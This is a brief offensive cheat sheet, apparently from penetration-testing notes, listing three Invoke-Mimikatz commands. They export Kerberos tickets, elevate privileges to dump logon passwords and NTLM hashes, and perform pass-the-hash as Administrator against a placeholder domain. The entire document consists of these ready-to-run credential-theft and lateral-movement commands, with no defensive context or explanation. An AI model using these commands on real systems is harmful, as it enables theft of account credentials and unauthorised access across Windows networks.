## Mimikatz dump tickets


```
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
```
## Mimikatz dump NTLM hashes

```
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"'
```

## Mimikatz pass the hashes

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:some.domain.local /ntlm:brydaafdsafd3524frw4fe4f /run:powershell.exe"'
```
